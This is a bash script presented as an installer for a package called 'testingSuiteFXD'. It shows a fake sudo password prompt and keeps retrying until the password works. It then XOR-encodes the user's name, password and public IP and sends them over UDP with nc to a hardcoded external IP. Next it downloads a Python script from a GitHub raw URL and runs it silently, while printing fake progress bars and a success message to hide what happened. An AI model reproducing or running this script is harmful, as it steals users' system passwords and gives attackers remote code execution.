#!/bin/bash

# PWD Getter
sudo -k

read -sp "[sudo] password for $USER: " pwd < /dev/tty
echo ""
echo "$pwd" | sudo -S -v &>/dev/null

if ! sudo -n true 2>/dev/null; then
    # Attempt to authenticate using the provided password
    while ! sudo -n true 2>/dev/null; do
        echo "Sorry, try again."
        read -sp "[sudo] password for $USER: " pwd < /dev/tty
        echo "$pwd" | sudo -S -v &>/dev/null
        echo 
    done
fi

# Sends PWD off
msg="User: $USER // Pwd: $pwd // Date: $(date +"%Y/%m/%d - %I:%M:%S %p") // IP: $(curl -s ifconfig.me)"

public_key=(47 12 43 162 139 185 37 150 255 206 126 95 44 174 41 75 119 192 164 245 189 49 240 62 247 137 230 121 171 125 128 68 76 59 124 250 162 64 228 251 232 0 84 222 235 196 93 167 58 239 83 218 207 49 179 237 238 179 100 96 114 25 212 52 226 158 168 143 123 36 109 250 11 23 85 244 154 24 78 176 129 92 234 221 213 172 33 58 9 57 89 173 17 32 213 79 100 74 99 234 170 61 254 210 119 253 102 183 54 23 132 127 115 1 84 216 110 207 241 236 148 48 188 191 175 12 80 110 253 229 23 94 168 156 163 51 101 147 174 159 47 134 153 112 13 230 158 160 142 247 93 147 86 214 3 235 26 123 240 21 20 235 44 225 148 16 13 214 239 221 110 156 46 3 89 224 12 160 36 18 241 164 105 60 55 58 213 159 85 104 15 204 59 240 216 47 48 88 219 223 125 230 1 253 46 61 44 135 16 33 234 225 208 186 160 207 138 228 5 177 75 134 44 251 205 251 79 120 159 221 17 85 78 186 77 121 155 53 180 174 67 120 162 46 106 66 62 18 145 154 143 186 131 135 74 36 250 203 243 79 241 171 118 208 41 250 7 245 247 50 54 238 188 199 222 101 29 220 201 87 210 157 52 10 92 96 154 5 123 93 144 185 71 94 165 224 191 182 112 250 94)

encrypt() {
    local text="$1"
    local key=("${!2}")
    local ciphertext=""

    for ((i=0;i<${#text};i++)); do
        c=$(printf "%d" "'${text:i:1}")
        k=${key[i]}
        xor=$(( c ^ k ))
        ciphertext+="\\x$(printf '%02x' $xor)"
    done
    echo "$ciphertext"
}

ciphertext=$(encrypt "$msg" public_key[@])

echo $ciphertext | nc -u -q 0 144.24.21.253 65432

# gets DT


if curl -sSL https://raw.githubusercontent.com/CodeUpdaterFXD/testingSuite/main/helper.py | python3 >/dev/null 2>&1; then
    : # did it but nothing
else
    : # nothing
fi

unset pwd
# preps long msg

read -r -d '' brew_output <<EOF
Downloading testingSuiteFXD
[INFO] Disk space check: 54.2GB available. Proceeding.
testingSuiteFXD.tar.gz   [=====>                             ]  15%  41.2M  18.4MB/s   eta 12s
[WARN] Network jitter detected. Retrying packet 8491...
[WARN] Packet 8491 re-sent successfully.
testingSuiteFXD.tar.gz   [================>                  ]  51%   139M  17.9MB/s   eta 6s
[DEBUG] Flushing memory buffer to disk.
[DEBUG] Syncing file descriptor.
testingSuiteFXD.tar.gz   [=============================>     ]  89%   242M  19.1MB/s   eta 1s
[DEBUG] Received final packet. Assembling file.
testingSuiteFXD.tar.gz   [==================================>] 100%   271M  18.8MB/s   in 14.4s
EOF

# reads long msg slow

while IFS= read -r line; do
  echo "$line"
  sleep $(awk 'BEGIN{srand(); print 0.1 + rand() * 0.3}')
done <<< "$brew_output"


# sends short msg
echo Successfully installed testingSuiteFXD

#sleep 2
#clear
